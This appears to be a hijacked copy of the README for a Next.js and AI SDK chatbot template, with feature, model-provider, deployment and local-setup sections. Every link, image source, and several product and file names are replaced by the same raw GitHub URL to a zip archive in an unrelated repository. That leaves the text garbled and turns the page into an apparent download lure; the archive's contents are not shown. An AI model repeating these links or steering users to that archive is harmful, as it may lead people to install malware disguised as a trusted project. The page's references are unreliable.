<a href="https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip">
  <img alt="https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip 14 and App Router-ready AI chatbot." src="app/(chat)https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip">
  <h1 align="center">Chat SDK</h1>
</a>

<p align="center">
    Chat SDK is a free, open-source template built with https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip and the AI SDK that helps you quickly build powerful chatbot applications.
</p>

<p align="center">
  <a href="https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip"><strong>Read Docs</strong></a> ·
  <a href="#features"><strong>Features</strong></a> ·
  <a href="#model-providers"><strong>Model Providers</strong></a> ·
  <a href="#deploy-your-own"><strong>Deploy Your Own</strong></a> ·
  <a href="#running-locally"><strong>Running locally</strong></a>
</p>
<br/>

## Features

- [https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip) App Router
  - Advanced routing for seamless navigation and performance
  - React Server Components (RSCs) and Server Actions for server-side rendering and increased performance
- [AI SDK](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip)
  - Unified API for generating text, structured objects, and tool calls with LLMs
  - Hooks for building dynamic chat and generative user interfaces
  - Supports xAI (default), OpenAI, Fireworks, and other model providers
- [shadcn/ui](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip)
  - Styling with [Tailwind CSS](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip)
  - Component primitives from [Radix UI](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip) for accessibility and flexibility
- Data Persistence
  - [Neon Serverless Postgres](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip) for saving chat history and user data
  - [Vercel Blob](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip) for efficient file storage
- [https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip)
  - Simple and secure authentication

## Model Providers

This template uses the [Vercel AI Gateway](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip) to access multiple AI models through a unified interface. The default configuration includes [xAI](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip) models (`grok-2-vision-1212`, `grok-3-mini`) routed through the gateway.

### AI Gateway Authentication

**For Vercel deployments**: Authentication is handled automatically via OIDC tokens.

**For non-Vercel deployments**: You need to provide an AI Gateway API key by setting the `AI_GATEWAY_API_KEY` environment variable in your `https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip` file.

With the [AI SDK](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip), you can also switch to direct LLM providers like [OpenAI](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip), [Anthropic](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip), [Cohere](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip), and [many more](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip) with just a few lines of code.

## Deploy Your Own

You can deploy your own version of the https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip AI Chatbot to Vercel with one click:

[![Deploy with Vercel](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip)](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip)

## Running locally

You will need to use the environment variables [defined in `https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip`](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip) to run https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip AI Chatbot. It's recommended you use [Vercel Environment Variables](https://raw.githubusercontent.com/vermatridev94/nextjs-ai-chatbo/main/public/ai_chatbo_nextjs_v1.7-alpha.1.zip) for this, but a `.env` file is all that is necessary.

> Note: You should not commit your `.env` file or it will expose secrets that will allow others to control access to your various AI and authentication provider accounts.

1. Install Vercel CLI: `npm i -g vercel`
2. Link local instance with Vercel and GitHub accounts (creates `.vercel` directory): `vercel link`
3. Download your environment variables: `vercel env pull`

```bash
pnpm install
pnpm dev
```

Your app template should now be running on [localhost:3000](http://localhost:3000).
